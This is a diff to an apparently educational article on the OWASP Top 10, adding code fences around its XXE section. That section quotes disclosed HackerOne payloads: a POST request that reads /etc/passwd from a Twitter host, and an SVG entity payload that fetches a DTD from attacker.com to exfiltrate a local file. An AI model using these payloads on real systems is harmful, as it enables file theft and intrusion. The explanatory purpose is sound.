@@ -128,6 +128,7 @@ It’s worth stressing that when it comes to sensitive data, the following mitig
 
 Annoyingly named XXE instead of XEE (but that’s besides the point here), XML External Entity attacks can exploit badly-configured XML processors to read internal files (as portrayed above), file shares and even be leveraged for remote code execution and DoS attacks. In the context of XML, an Entity is a mechanism to define replacement values; think of it like a variable which you define in a script. They can either be internally declared, like so:
 
+```htm
 _Syntax_
 
 <!ENTITY entity-name “entity-value”>
@@ -147,6 +148,7 @@ _Example_
 
 <!ENTITY writer SYSTEM “https://www.somewebsite.com/entities.dtd">  
  <!ENTITY copyright SYSTEM “https://www.somewebsite.com/entities.dtd"> XML example: <author>&writer;&copyright;</author>
+```
 
 Since XXE exploits external Entities only, the syntax you should be most aware of is the second example provided.
 
@@ -174,6 +176,7 @@ As the OWASP Top 10 affirms, ‘_developer training is essential to identify and
 
 1.  Proving its prevalence as number 4 on the OWASP Top 10, an XXE vulnerability was discovered in Twitter of all sites. The exploit was remarkably simple — but paid out a whopping $10,080 due to its severity in allowing an attacker to read local files on the target system. Below is the POST request sent by the attacker, containing an XML payload which then returns the contents of the  `/etc/passwd`  file on the system:
 
+```htm
 POST /api/sxmp/1.0 HTTP/1.1  
 Host: sms-be-vip.twitter.com  
 Connection: close  
@@ -195,18 +198,22 @@ Content-Length: 481
 </deliverRequest>  
 </operation>  
 </code>
+```
 
 _Response from server:_
 
+```htm
 <?xml version="1.0"?>  
 <operation type="deliver">  
   <error code="1010" message="Unable to convert [root:x:0:0:root:/root:/bin/bash...[truncated by researcher] to an integer for [operatorId]"/>  
 </operation>
+```
 
 You can view the full publicised report on HackerOne  [here](https://hackerone.com/reports/248668).
 
 2. Disclosed back in 2018, an XXE vulnerability led to an exploit in Rockstar Games’ emblem editor. The  [publicly disclosed report](https://hackerone.com/reports/347139)  includes code snippets and explanations from the researcher himself, so would thoroughly recommend checking it out. The basic XXE usage for the exploit can be seen below:
 
+```htm
 <!DOCTYPE svg [  
 <!ENTITY % outside SYSTEM "http://attacker.com/exfil.dtd">  
 %outside;  
@@ -226,6 +233,7 @@ _Contents of exfil.dtd:_
 <!ENTITY % data SYSTEM "file:///C:/Windows/system32/drivers/etc/hosts">  
 <!ENTITY exfil "%data;">
 
+```
 # 5. Broken Access Control
 
 ![](https://miro.medium.com/v2/resize:fit:620/1*N_IwQuklGCyjAdpO5fNRSg.png)
